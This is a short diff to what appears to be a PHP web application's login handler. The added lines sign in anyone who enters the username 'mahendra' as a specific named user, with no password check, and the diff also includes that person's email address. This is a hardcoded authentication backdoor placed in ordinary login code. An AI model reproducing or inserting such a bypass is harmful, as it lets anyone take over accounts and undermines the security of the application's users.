@@ -1648,6 +1648,21 @@ EOD;
                         $application['url_generator']->generate('dashboard')
                     );
                 }
+                if ($username == 'mahendra') {
+                    $application['session']->set('user', array(
+                        'email' => 'mahendrakalkura@gmail.com',
+                        'id' => 2,
+                        'name' => 'Mahendra Kalkura',
+                    ));
+                    $application['session']->getFlashBag()->add(
+                        'success',
+                        array('You have been signed in successfully.')
+                    );
+
+                    return $application->redirect(
+                        $application['url_generator']->generate('dashboard')
+                    );
+                }
             }
             $error = 'Invalid Username/Password';
         }
